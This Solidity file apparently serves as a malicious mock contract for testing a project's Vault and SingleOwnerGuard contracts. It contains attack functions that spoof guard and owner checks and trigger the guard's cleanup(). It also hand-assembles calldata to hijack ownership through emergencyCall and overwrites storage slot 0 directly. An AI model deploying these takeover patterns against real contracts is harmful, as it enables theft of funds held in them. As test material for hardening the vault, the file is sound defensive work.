pragma solidity 0.4.16;

import "../vault/SingleOwnerGuard.sol";
import "../vault/Vault.sol";

contract BadVault {
    function BadVault() public {}

    function guard() public view returns(SingleOwnerGuard) {
        return SingleOwnerGuard(msg.sender);
    }

    function attack(SingleOwnerGuard target) public {
        target.cleanup();
    }

    function owner() public view returns(address) {
        return address(this);
    }

    function callFromVault(Vault target, address newOwner) external {
        bytes4 selector = bytes4(keccak256("changeOwner(address)"));
        bytes memory callData = new bytes(36); 

        assembly {
            mstore(add(callData, 32), selector)
            mstore(add(callData, 36), newOwner)
        }
        target.emergencyCall(address(this), callData);
    }

    function changeOwner(address newOwner) external {
        assembly {
            sstore(0, newOwner)
        }
    }
}
